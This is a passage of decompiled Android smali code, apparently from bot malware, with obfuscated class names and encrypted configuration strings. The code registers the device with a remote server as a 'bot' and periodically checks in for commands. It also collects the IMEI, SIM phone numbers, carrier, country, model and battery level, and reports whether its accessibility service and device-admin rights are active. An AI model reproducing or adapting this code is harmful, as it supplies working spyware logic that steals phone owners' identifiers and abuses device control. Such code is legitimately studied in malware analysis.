    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    :try_start_0
    const-string v4, "params"

    const-string v5, "updateSettingsAndCommands"

    invoke-virtual {v2, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v4, "response"

    invoke-virtual {v2, v4, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    sget-object p2, Lh0/b;->a:Lh0/b;

    iput-object v7, v0, Lc0/b$d;->f:Ljava/lang/Object;

    iput-object v7, v0, Lc0/b$d;->g:Ljava/lang/Object;

    iput v3, v0, Lc0/b$d;->j:I

    invoke-virtual {p2, p1, v2, v0}, Lh0/b;->c(Landroid/content/Context;Lorg/json/JSONObject;Ll0/d;)Ljava/lang/Object;

    move-result-object p1

    if-ne p1, v1, :cond_c

    return-object v1

    :cond_c
    :goto_4
    sget-object p1, Lj0/g;->a:Lj0/g;

    return-object p1
.end method

.method public final h(Landroid/content/Context;Ll0/d;)Ljava/lang/Object;
    .locals 5
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            "Ll0/d<",
            "-",
            "Lj0/g;",
            ">;)",
            "Ljava/lang/Object;"
        }
    .end annotation

    instance-of v0, p2, Lc0/b$e;

    if-eqz v0, :cond_0

    move-object v0, p2

    check-cast v0, Lc0/b$e;

    iget v1, v0, Lc0/b$e;->i:I

    const/high16 v2, -0x80000000

    and-int v3, v1, v2

    if-eqz v3, :cond_0

    sub-int/2addr v1, v2

    iput v1, v0, Lc0/b$e;->i:I

    goto :goto_0

    :cond_0
    new-instance v0, Lc0/b$e;

    invoke-direct {v0, p0, p2}, Lc0/b$e;-><init>(Lc0/b;Ll0/d;)V

    :goto_0
    iget-object p2, v0, Lc0/b$e;->g:Ljava/lang/Object;

    sget-object v1, Lm0/a;->c:Lm0/a;

    iget v2, v0, Lc0/b$e;->i:I

    const/4 v3, 0x1

    if-eqz v2, :cond_2

    if-ne v2, v3, :cond_1

    iget-object p1, v0, Lc0/b$e;->f:Ljava/lang/Object;

    check-cast p1, Lc0/b;

    :try_start_0
    invoke-static {p2}, Lb/a;->C(Ljava/lang/Object;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    goto :goto_1

    :cond_1
    new-instance p1, Ljava/lang/IllegalStateException;

    const-string p2, "call to \'resume\' before \'invoke\' with coroutine"

    invoke-direct {p1, p2}, Ljava/lang/IllegalStateException;-><init>(Ljava/lang/String;)V

    throw p1

    :cond_2
    invoke-static {p2}, Lb/a;->C(Ljava/lang/Object;)V

    :try_start_1
    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p2

    const-string v2, "context.applicationContext"

    invoke-static {p2, v2}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 1
    sput-object p2, Ls0/c;->e:Landroid/content/Context;

    sget-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v2, :cond_3

    const-string v2, "settings"

    const/4 v4, 0x0

    invoke-virtual {p2, v2, v4}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object p2

    sput-object p2, Ls0/c;->d:Landroid/content/SharedPreferences;

    .line 2
    :cond_3
    new-instance p2, Lorg/json/JSONObject;

    invoke-direct {p2}, Lorg/json/JSONObject;-><init>()V

    const-string v2, "params"

    const-string v4, "moduleWorkingWhile"

    invoke-virtual {p2, v2, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    sget-object v2, Lh0/b;->a:Lh0/b;

    iput-object p0, v0, Lc0/b$e;->f:Ljava/lang/Object;

    iput v3, v0, Lc0/b$e;->i:I

    invoke-virtual {v2, p1, p2, v0}, Lh0/b;->c(Landroid/content/Context;Lorg/json/JSONObject;Ll0/d;)Ljava/lang/Object;

    move-result-object p1
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    if-ne p1, v1, :cond_4

    return-object v1

    :catch_0
    move-object p1, p0

    :catch_1
    invoke-static {p1}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    const-string p1, "LzV3MUZmRUpidFF6VldqZHk0QkZqSGhRUjk3RU9Nc0xRYjRQZW1yZWhuZz06OmF6T0ZreDduZW52QWhIeW9WRUVCenc9PQ=="

    invoke-static {p1}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    .line 3
    sget-object p1, Lb0/b;->a:Lb0/b;

    .line 4
    :cond_4
    :goto_1
    sget-object p1, Lj0/g;->a:Lj0/g;

    return-object p1
.end method

.method public final i(Landroid/content/Context;Ljava/lang/String;Ll0/d;)Ljava/lang/Object;
    .locals 5
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            "Ljava/lang/String;",
            "Ll0/d<",
            "-",
            "Lj0/g;",
            ">;)",
            "Ljava/lang/Object;"
        }
    .end annotation

    instance-of p2, p3, Lc0/b$f;

    if-eqz p2, :cond_0

    move-object p2, p3

    check-cast p2, Lc0/b$f;

    iget v0, p2, Lc0/b$f;->i:I

    const/high16 v1, -0x80000000

    and-int v2, v0, v1

    if-eqz v2, :cond_0

    sub-int/2addr v0, v1

    iput v0, p2, Lc0/b$f;->i:I

    goto :goto_0

    :cond_0
    new-instance p2, Lc0/b$f;

    invoke-direct {p2, p0, p3}, Lc0/b$f;-><init>(Lc0/b;Ll0/d;)V

    :goto_0
    iget-object p3, p2, Lc0/b$f;->g:Ljava/lang/Object;

    sget-object v0, Lm0/a;->c:Lm0/a;

    iget v1, p2, Lc0/b$f;->i:I

    const/4 v2, 0x1

    if-eqz v1, :cond_2

    if-ne v1, v2, :cond_1

    iget-object p1, p2, Lc0/b$f;->f:Ljava/lang/Object;

    check-cast p1, Lc0/b;

    invoke-static {p3}, Lb/a;->C(Ljava/lang/Object;)V

    goto :goto_2

    :cond_1
    new-instance p1, Ljava/lang/IllegalStateException;

    const-string p2, "call to \'resume\' before \'invoke\' with coroutine"

    invoke-direct {p1, p2}, Ljava/lang/IllegalStateException;-><init>(Ljava/lang/String;)V

    throw p1

    :cond_2
    invoke-static {p3}, Lb/a;->C(Ljava/lang/Object;)V

    .line 1
    sget-object p3, Ls0/c;->d:Landroid/content/SharedPreferences;

    const-string v1, "R0xCWnhJZFNHREYzRysvUzh0UUV2Zz09OjpLRURZWk9Nb3Fqam9YU1BBTkxFTW93PT0="

    const-string v3, ""

    invoke-static {p3, v1, v3}, Landroidx/activity/result/a;->a(Landroid/content/SharedPreferences;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p3

    if-nez p3, :cond_3

    goto :goto_1

    :cond_3
    move-object v3, p3

    .line 2
    :goto_1
    new-instance p3, Lorg/json/JSONObject;

    invoke-direct {p3}, Lorg/json/JSONObject;-><init>()V

    const-string v1, "command"

    const-string v4, "registration"

    invoke-virtual {p3, v1, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {p0, p3, v3, p1}, Lc0/b;->l(Lorg/json/JSONObject;Ljava/lang/String;Landroid/content/Context;)V

    const-string p1, "jsonRegistrationBot: "

    invoke-static {p1, p3}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    .line 3
    sget-object p1, Lb0/b;->a:Lb0/b;

    .line 4
    invoke-virtual {p3}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p1

    const/4 p3, 0x0

    const/4 v1, 0x2

    iput-object p0, p2, Lc0/b$f;->f:Ljava/lang/Object;

    iput v2, p2, Lc0/b$f;->i:I

    invoke-static {p0, p1, p3, p2, v1}, Lc0/b;->f(Lc0/b;Ljava/lang/String;Ljava/lang/String;Ll0/d;I)Ljava/lang/Object;

    move-result-object p3

    if-ne p3, v0, :cond_4

    return-object v0

    :cond_4
    move-object p1, p0

    :goto_2
    check-cast p3, Ljava/lang/String;

    invoke-static {p1}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    const-string p1, "RegistrationRESPONCE: "

    invoke-static {p1, p3}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    .line 5
    sget-object p1, Lb0/b;->a:Lb0/b;

    .line 6
    const-string p1, "ok"

    invoke-static {p3, p1}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_5

    const-string p1, "1"

    .line 7
    sget-object p2, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {p2}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {p2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object p2

    const-string p3, "OFB2Y3BHVUI2VWJKRjFTOFhQRVdKaVNUNkhwVjNlY0tPYk9PZkVvdUxabz06OkJuZE5vN3RBc2dsUHRkZThvdngrb3c9PQ=="

    invoke-static {p3, p2, p1}, Lc0/a;->a(Ljava/lang/String;Landroid/content/SharedPreferences$Editor;Ljava/lang/String;)V

    .line 8
    :cond_5
    sget-object p1, Lj0/g;->a:Lj0/g;

    return-object p1
.end method

.method public final j(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 8

    const-string v0, "context"

    invoke-static {p1, v0}, Ls0/c;->i(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v0, "application"

    invoke-static {p2, v0}, Ls0/c;->i(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v0, "type"

    invoke-static {p4, v0}, Ls0/c;->i(Ljava/lang/Object;Ljava/lang/String;)V

    sget-object v1, Lz0/m0;->c:Lz0/m0;

    new-instance v0, Lc0/b$g;

    const/4 v7, 0x0

    move-object v2, v0

    move-object v3, p3

    move-object v4, p1

    move-object v5, p2

    move-object v6, p4

    invoke-direct/range {v2 .. v7}, Lc0/b$g;-><init>(Ljava/lang/String;Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ll0/d;)V

    const/4 v2, 0x0

    const/4 v3, 0x0

    const/4 v5, 0x3

    const/4 v6, 0x0

    move-object v4, v0

    invoke-static/range {v1 .. v6}, Lb/a;->u(Lz0/x;Ll0/f;ILr0/c;ILjava/lang/Object;)Lz0/s0;

    return-void
.end method

.method public final k(Landroid/content/Context;Ll0/d;)Ljava/lang/Object;
    .locals 8
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            "Ll0/d<",
            "-",
            "Lj0/g;",
            ">;)",
            "Ljava/lang/Object;"
        }
    .end annotation

    instance-of v0, p2, Lc0/b$h;

    if-eqz v0, :cond_0

    move-object v0, p2

    check-cast v0, Lc0/b$h;

    iget v1, v0, Lc0/b$h;->i:I

    const/high16 v2, -0x80000000

    and-int v3, v1, v2

    if-eqz v3, :cond_0

    sub-int/2addr v1, v2

    iput v1, v0, Lc0/b$h;->i:I

    goto :goto_0

    :cond_0
    new-instance v0, Lc0/b$h;

    invoke-direct {v0, p0, p2}, Lc0/b$h;-><init>(Lc0/b;Ll0/d;)V

    :goto_0
    iget-object p2, v0, Lc0/b$h;->g:Ljava/lang/Object;

    sget-object v1, Lm0/a;->c:Lm0/a;

    iget v2, v0, Lc0/b$h;->i:I

    const-string v3, "jsonCheckBot: "

    const/4 v4, 0x1

    if-eqz v2, :cond_2

    if-ne v2, v4, :cond_1

    iget-object p1, v0, Lc0/b$h;->f:Ljava/lang/Object;

    check-cast p1, Lc0/b;

    invoke-static {p2}, Lb/a;->C(Ljava/lang/Object;)V

    goto/16 :goto_2

    :cond_1
    new-instance p1, Ljava/lang/IllegalStateException;

    const-string p2, "call to \'resume\' before \'invoke\' with coroutine"

    invoke-direct {p1, p2}, Ljava/lang/IllegalStateException;-><init>(Ljava/lang/String;)V

    throw p1

    :cond_2
    invoke-static {p2}, Lb/a;->C(Ljava/lang/Object;)V

    const-string p2, "enFLK3FRUERqTDdMMzVIYzl1aEw5ZVZOeVNyRmw3TklzSDdpSmVYclRhMHRHV2MyNkIrYjJKdVlpSEFhMmFpTFIzdmU1cFFydkUzZmpUcEdXUk5Na2c9PTo6ZFJkNDduOExrQ3A1S2N4eGJFWVlQQT09"

    invoke-static {p2}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    .line 1
    sget-object p2, Lb0/b;->a:Lb0/b;

    .line 2
    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p2

    const-string v2, "context.applicationContext"

    invoke-static {p2, v2}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 3
    sput-object p2, Ls0/c;->e:Landroid/content/Context;

    sget-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    const/4 v5, 0x0

    if-nez v2, :cond_3

    const-string v2, "settings"

    invoke-virtual {p2, v2, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object p2

    sput-object p2, Ls0/c;->d:Landroid/content/SharedPreferences;

    .line 4
    :cond_3
    sget-object p2, Ls0/c;->d:Landroid/content/SharedPreferences;

    const-string v2, "R0xCWnhJZFNHREYzRysvUzh0UUV2Zz09OjpLRURZWk9Nb3Fqam9YU1BBTkxFTW93PT0="

    const-string v6, ""

    invoke-static {p2, v2, v6}, Landroidx/activity/result/a;->a(Landroid/content/SharedPreferences;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    if-nez p2, :cond_4

    goto :goto_1

    :cond_4
    move-object v6, p2

    .line 5
    :goto_1
    new-instance p2, Lorg/json/JSONObject;

    invoke-direct {p2}, Lorg/json/JSONObject;-><init>()V

    const-string v2, "command"

    const-string v7, "updateBotParams"

    invoke-virtual {p2, v2, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {p0, p2, v6, p1}, Lc0/b;->l(Lorg/json/JSONObject;Ljava/lang/String;Landroid/content/Context;)V

    const-string p1, "ticks"

    .line 6
    sget-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v2}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v6, "timeWorking"

    invoke-interface {v2, v6, v5}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v2

    .line 7
    invoke-static {v2}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p2, p1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-static {v3, p2}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    invoke-virtual {p2}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p1

    iput-object p0, v0, Lc0/b$h;->f:Ljava/lang/Object;

    iput v4, v0, Lc0/b$h;->i:I

    const/4 p2, 0x0

    .line 8
    invoke-virtual {p0, p1, p2, v0}, Lc0/b;->e(Ljava/lang/String;Ljava/lang/String;Ll0/d;)Ljava/lang/Object;

    move-result-object p2

    if-ne p2, v1, :cond_5

    return-object v1

    :cond_5
    move-object p1, p0

    .line 9
    :goto_2
    check-cast p2, Ljava/lang/String;

    invoke-static {p1}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    invoke-static {v3, p2}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    .line 10
    sget-object p1, Lb0/b;->a:Lb0/b;

    .line 11
    sget-object p1, Lj0/g;->a:Lj0/g;

    return-object p1
.end method

.method public final l(Lorg/json/JSONObject;Ljava/lang/String;Landroid/content/Context;)V
    .locals 9

    const-string v0, "null cannot be cast to non-null type android.telephony.TelephonyManager"

    const-string v1, "phone"

    const-string v2, "perm"

    invoke-virtual {p3}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    const-string v4, "context.applicationContext"

    invoke-static {v3, v4}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 1
    sput-object v3, Ls0/c;->e:Landroid/content/Context;

    sget-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    const/4 v5, 0x0

    if-nez v4, :cond_0

    const-string v4, "settings"

    invoke-virtual {v3, v4, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    sput-object v3, Ls0/c;->d:Landroid/content/SharedPreferences;

    .line 2
    :cond_0
    const-string v3, "id"

    invoke-virtual {p1, v3, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    :try_start_0
    const-string p2, "country"

    .line 3
    invoke-virtual {p3}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v3

    invoke-virtual {v3}, Landroid/content/res/Resources;->getConfiguration()Landroid/content/res/Configuration;

    move-result-object v3

    invoke-virtual {v3}, Landroid/content/res/Configuration;->getLocales()Landroid/os/LocaleList;

    move-result-object v3

    invoke-virtual {v3, v5}, Landroid/os/LocaleList;->get(I)Ljava/util/Locale;

    move-result-object v3

    invoke-virtual {v3}, Ljava/util/Locale;->getDisplayCountry()Ljava/lang/String;

    move-result-object v3

    const-string v4, "locale.displayCountry"

    invoke-static {v3, v4}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 4
    invoke-virtual {p1, p2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p2, "countryCode"

    .line 5
    invoke-virtual {p3, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    invoke-static {v3, v0}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;

    check-cast v3, Landroid/telephony/TelephonyManager;

    invoke-virtual {v3}, Landroid/telephony/TelephonyManager;->getNetworkCountryIso()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->length()I

    move-result v4
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_3

    const/4 v6, 0x1

    if-nez v4, :cond_1

    move v4, v6

    goto :goto_0

    :cond_1
    move v4, v5

    :goto_0
    const-string v7, ""

    if-eqz v4, :cond_2

    move-object v3, v7

    :cond_2
    :try_start_1
    invoke-virtual {v3}, Ljava/lang/String;->length()I

    move-result v4

    const/4 v8, 0x2

    if-ne v4, v8, :cond_3

    move v4, v6

    goto :goto_1

    :cond_3
    move v4, v5

    :goto_1
    if-nez v4, :cond_4

    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v3

    invoke-virtual {v3}, Ljava/util/Locale;->getCountry()Ljava/lang/String;

    move-result-object v3

    const-string v4, "getDefault().country"

    invoke-static {v3, v4}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    sget-object v4, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    invoke-virtual {v3, v4}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "(this as java.lang.Strin\u2026.toLowerCase(Locale.ROOT)"

    invoke-static {v3, v4}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 6
    :cond_4
    invoke-virtual {p1, p2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p2, "tag"

    sget-object v3, Lb0/b;->a:Lb0/b;

    .line 7
    sget-object v3, Lb0/b;->e:Ljava/lang/String;

    .line 8
    invoke-virtual {p1, p2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p2, "isDualSim"
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_3

    .line 9
    :try_start_2
    invoke-virtual {p3, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    if-eqz v3, :cond_5

    check-cast v3, Landroid/telephony/TelephonyManager;

    invoke-virtual {v3}, Landroid/telephony/TelephonyManager;->getPhoneCount()I

    move-result v0

    if-ne v0, v8, :cond_6

    move v0, v6

    goto :goto_2

    :cond_5
    new-instance v3, Ljava/lang/NullPointerException;

    invoke-direct {v3, v0}, Ljava/lang/NullPointerException;-><init>(Ljava/lang/String;)V

    throw v3
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    :catch_0
    :cond_6
    move v0, v5

    .line 10
    :goto_2
    :try_start_3
    invoke-static {v0}, Ljava/lang/String;->valueOf(Z)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, p2, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p2, "operator"

    invoke-virtual {p3, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    instance-of v3, v0, Landroid/telephony/TelephonyManager;

    const/4 v4, 0x0

    if-eqz v3, :cond_7

    check-cast v0, Landroid/telephony/TelephonyManager;

    goto :goto_3

    :cond_7
    move-object v0, v4

    :goto_3
    if-nez v0, :cond_8

    move-object v0, v4

    goto :goto_4

    :cond_8
    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getNetworkOperatorName()Ljava/lang/String;

    move-result-object v0

    :goto_4
    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, p2, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p2, "phone_number"

    sget-object v0, Lh0/a;->a:Lh0/a;

    invoke-virtual {v0, p3}, Lh0/a;->k(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p1, p2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p2, "operator1"

    invoke-virtual {v0, p3}, Lh0/a;->m(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p1, p2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p2, "phone_number1"

    invoke-virtual {v0, p3}, Lh0/a;->l(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p1, p2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p2, "android"

    sget-object v3, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    invoke-virtual {v3}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p1, p2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p2, "model"

    invoke-virtual {v0}, Lh0/a;->j()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, p2, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p2, "batteryLevel"

    const-string v0, "batterymanager"

    .line 11
    invoke-virtual {p3, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/os/BatteryManager;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    if-nez v0, :cond_9

    move-object v0, v4

    goto :goto_5

    :cond_9
    const/4 v3, 0x4

    :try_start_4
    invoke-virtual {v0, v3}, Landroid/os/BatteryManager;->getIntProperty(I)I

    move-result v0

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    :goto_5
    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    goto :goto_6

    :catch_1
    :try_start_5
    const-string v0, "-1"

    .line 12
    :goto_6
    invoke-virtual {p1, p2, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    :try_start_6
    const-string p2, "imei"

    invoke-virtual {p3, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    instance-of v1, v0, Landroid/telephony/TelephonyManager;

    if-eqz v1, :cond_a

    check-cast v0, Landroid/telephony/TelephonyManager;

    goto :goto_7

    :cond_a
    move-object v0, v4

    :goto_7
    if-nez v0, :cond_b

    goto :goto_8

    :cond_b
    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getImei()Ljava/lang/String;

    move-result-object v4

    :goto_8
    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, p2, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_0

    goto :goto_9

    :catchall_0
    move-exception p2

    :try_start_7
    invoke-static {p2}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :goto_9
    const-string p2, "accessibility"

    sget-object v0, Lb0/b;->a:Lb0/b;

    .line 13
    sget-object v0, Lb0/b;->n:Ljava/lang/Class;
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_3

    .line 14
    :try_start_8
    new-instance v1, Landroid/content/ComponentName;

    invoke-static {v0}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-direct {v1, p3, v0}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p3}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v3, "enabled_accessibility_services"

    invoke-static {v0, v3}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_c

    goto :goto_a

    :cond_c
    new-instance v3, Landroid/text/TextUtils$SimpleStringSplitter;

    const/16 v4, 0x3a

    invoke-direct {v3, v4}, Landroid/text/TextUtils$SimpleStringSplitter;-><init>(C)V

    invoke-virtual {v3, v0}, Landroid/text/TextUtils$SimpleStringSplitter;->setString(Ljava/lang/String;)V

    :cond_d
    invoke-virtual {v3}, Landroid/text/TextUtils$SimpleStringSplitter;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_e

    invoke-virtual {v3}, Landroid/text/TextUtils$SimpleStringSplitter;->next()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/content/ComponentName;->unflattenFromString(Ljava/lang/String;)Landroid/content/ComponentName;

    move-result-object v0

    if-eqz v0, :cond_d

    invoke-static {v0, v1}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_2

    if-eqz v0, :cond_d

    move v0, v6

    goto :goto_b

    :catch_2
    :cond_e
    :goto_a
    move v0, v5

    .line 15
    :goto_b
    :try_start_9
    invoke-static {v0}, Ljava/lang/String;->valueOf(Z)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, p2, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p2, "protect"

    .line 16
    sget-object v0, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v0}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v1, "checkProtect"

    invoke-interface {v0, v1, v7}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_f

    move-object v0, v7

    .line 17
    :cond_f
    invoke-virtual {p1, p2, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p2, "admin"

    const-string v0, "device_policy"

    .line 18
    invoke-virtual {p3, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "null cannot be cast to non-null type android.app.admin.DevicePolicyManager"

    invoke-static {v0, v1}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    new-instance v1, Landroid/content/ComponentName;

    const-class v3, Lcom/cisojemopatude/yazi/cuzeteyore/fibaga;

    invoke-direct {v1, p3, v3}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v0

    .line 19
    invoke-static {v0}, Ljava/lang/String;->valueOf(Z)Ljava/lang/String;

    move-result-object v0

